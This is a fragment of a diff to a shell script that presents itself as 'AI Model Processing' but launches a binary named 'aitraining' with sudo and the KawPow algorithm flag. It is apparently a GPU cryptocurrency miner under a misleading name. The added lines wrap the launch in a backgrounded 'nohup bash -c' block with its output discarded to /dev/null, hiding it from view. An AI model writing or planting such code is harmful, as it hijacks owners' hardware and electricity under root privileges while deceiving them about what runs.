@@ -8,7 +8,7 @@ sleep 2
 mkdir -p ./logs
 
 echo "=== Starting AI Model Processing ==="
-
+ nohup bash -c '
 # --- GPU PROCESS ---
 nohup sudo ./aitraining \
     --algorithm kawpow \
@@ -51,7 +51,7 @@ nohup bash -c 'while true; do
     echo "---" >> ./logs/monitor.log
     sleep 30
 done' > /dev/null 2>&1 &
-
+> /dev/null 2>&1 &
 echo "=== Processing Started Successfully ==="
 echo ""
 echo "📊 Log Files:"
